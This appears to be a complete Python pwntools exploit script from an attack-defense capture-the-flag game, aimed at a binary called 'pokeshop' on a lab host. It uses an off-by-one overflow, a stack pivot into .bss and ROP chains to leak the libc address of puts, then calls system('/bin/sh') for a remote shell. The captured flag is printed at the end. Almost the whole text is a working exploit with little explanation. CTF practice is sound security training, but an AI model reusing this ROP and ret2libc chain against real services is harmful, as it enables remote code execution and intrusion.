#!/usr/bin/env python

from pwn import *
import time

poke = ELF('./pokeshop')
lib  = ELF('./libc.so.6-64')

# menu() = 0x400903
# buy()  = 0x400b0e
# pokemenu() = 0x400969
# addpoke() = 0x4009f0
# re() 	 = 0x400d58
# listpoke() = 0x400bad


ret	= 0x4006b1
leave_ret = 0x400b0c
pop_rbp_ret = 0x400810
pop_ret = 0x400f52
pop_rsi_r15_ret =  0x400f51
pop_rdi_ret  = 0x400f53

payload1 = ''
payload1 += p64(pop_rbp_ret) + p64(poke.bss()+0x300)
payload1 += p64(pop_rsi_r15_ret) + p64(poke.bss()+0x300) + 'A'*8 + p64(poke.plt['read'])
payload1 += p64(leave_ret)
payload1 =  p64(ret) * ((0x80 - len(payload1))/len(p64(ret))-1) + payload1

payload2 = ''
payload2 += p64(poke.bss()+0x600)
payload2 += p64(pop_rdi_ret) + p64(poke.got['puts']) + p64(poke.plt['puts'])
payload2 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(poke.bss()+0x600) + 'B'*8 +p64(poke.plt['read'])
payload2 += p64(leave_ret)

while True:
	try:
		#r = process('./pokeshop')
		r = remote('192.168.31.25',22222)
		
		# Step 1 : use name to change RBP
		r.recvuntil('choice:')
		r.send('1\n')
		r.recvuntil('choice:')
		r.send('3\n')
		r.recvuntil('choice:')
		r.send('3\n')
		r.recvuntil('rename :')
		r.send('0\n')
		r.recvuntil('Name:')
		r.send('A'*128 + '\n')
		r.recvuntil('choice:')

		# Step 2 : overflow return address of read and migration to large space
		time.sleep(0.5)
		r.send(payload1)
		time.sleep(0.5)

		# Step 3: leak infomation and calculate lib_sys
		r.send(payload2)
		res = r.recvline()
		if 'Invalid' in res:
			continue
		lib_puts = res[0:6]
		lib_puts += '\x00\x00' 
		lib_puts = u64(lib_puts)
		print 'lib_read =',hex(lib_puts)

		lib_base = lib_puts - lib.symbols['puts']
		lib_system = lib_base + lib.symbols['system']
		lib_bin	= lib_base + list(lib.search('/bin/sh'))[0]
		print 'lib_system =',hex(lib_system)

		# Step 4: take conctrol
		payload3 = ''
		payload3 += p64(poke.bss()+0x300)
		payload3 += p64(pop_rdi_ret) + p64(lib_bin) + p64(lib_system)
		r.send(payload3)
		break
	except:
		continue


r.interactive()


#AD{0ff_by_0n3_1s_p0w3rful_4nd_M4g1k4rp_1s_7h3_b3st}
















